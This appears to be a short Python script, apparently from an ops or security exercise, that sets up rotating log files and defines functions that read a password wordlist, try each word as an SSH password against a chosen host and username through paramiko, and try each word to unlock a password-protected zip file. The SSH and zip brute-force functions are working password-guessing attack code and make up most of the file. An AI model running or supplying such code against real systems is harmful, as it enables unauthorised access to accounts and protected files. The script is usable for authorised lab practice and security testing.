import os
import time
import paramiko
import zipfile
import logging
from logging.handlers import RotatingFileHandler, TimedRotatingFileHandler

# Check if the log file exists, if not, create it
if not os.path.exists('ops26-1.log'):
    with open('ops26-1.log', 'w'):
        pass

# Setup basic logging
# Create a rotating file handler for size-based rotation
size_handler = RotatingFileHandler('ops26-1.log', maxBytes=1000000, backupCount=5)
# Create a timed rotating file handler for time-based rotation
time_handler = TimedRotatingFileHandler('ops26-1.log', when='midnight', interval=1, backupCount=5)

# Set logging level to DEBUG
size_handler.setLevel(logging.DEBUG)
time_handler.setLevel(logging.DEBUG)

# Set format for log entries
formatter = logging.Formatter('%(asctime)s %(levelname)s:%(message)s')
size_handler.setFormatter(formatter)
time_handler.setFormatter(formatter)

# Add the handlers to the logger
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
logger.addHandler(size_handler)
logger.addHandler(time_handler)

def read_wordlist(file_path):
    try:
        with open(file_path, 'r', encoding='latin-1') as file:
            words = file.readlines()
            logging.info(f"Wordlist read successfully from {file_path}")
            return words
    except FileNotFoundError:
        logging.error(f"File not found: {file_path}")
        return None

def dictionary_iterator(words):
    for word in words:
        word = word.strip()
        logging.debug(f"Word iterated: {word}")
        time.sleep(0.5)  # Delay of 0.5 seconds between words

def password_recognized(search_string, words):
    if search_string in words:
        logging.info(f"Search string found: {search_string}")
        return True
    else:
        logging.warning(f"Search string not found: {search_string}")
        return False

def ssh_brute_force(host, username, words):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in words:
        password = password.strip()
        try:
            ssh.connect(host, username=username, password=password)
            logging.info(f"Successful SSH login - Username: {username}, Password: {password}")
            return True
        except paramiko.AuthenticationException:
            logging.warning(f"Failed SSH login attempt - Username: {username}, Password: {password}")
        except paramiko.SSHException as e:
            logging.error(f"SSH error - Username: {username}, Password: {password}: {str(e)}")
        except Exception as e:
            logging.error(f"General error - Username: {username}, Password: {password}: {str(e)}")

    ssh.close()
    return False

def zip_brute_force(zip_file_path, words):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
        for password in words:
            password = password.strip()
            try:
                zip_file.extractall(pwd=password.encode())
                logging.info(f"Password cracked: {password}")
                return True
            except Exception as e:
                logging.debug(f"Failed attempt with password: {password}, Error: {str(e)}")
                pass
    return False
